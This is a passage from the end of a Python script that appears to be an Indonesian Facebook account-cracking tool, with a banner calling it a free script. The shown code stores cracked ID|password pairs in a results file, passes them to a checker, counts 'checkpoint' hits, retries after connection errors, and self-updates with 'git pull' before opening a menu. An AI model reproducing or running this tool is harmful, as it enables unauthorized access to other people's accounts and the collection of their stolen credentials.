				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
				print(f'{kun}{ua}')
				open('XSHIN-CP/'+'XSHIN-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


def asep():
    os.system("cls" if os.name == "nt" else "clear")
    Console(width=50, style="bold hot_pink2").print(
        Panel(
            """[bold red]●[bold yellow] ●[bold green] ●                               
 _____                __ __ _____             
|  _  |___ ___ ___   |  |  |  |  |___ _ _ ___ 
|     |_ -| -_| . |  |_   _|  |  |_ -| | | . |
|__|__|___|___|  _|    |_| |_____|___|___|  _|
              |_|                        |_|  

[bold blue]                SUKAMAKAMUR[bold blue]""",
            title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] SC GERATIS [bold green]<[bold yellow]<[bold red]<",
        )
    )


# -----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__ == "__main__":
    try:
        os.system("git pull")
    except:
        pass
    try:
        os.mkdir("OK")
    except:
        pass
    try:
        os.mkdir("CP")
    except:
        pass
    try:
        os.system("cls" if os.name == "nt" else "clear")
    except:
        pass
    time.sleep(3)
    menu()
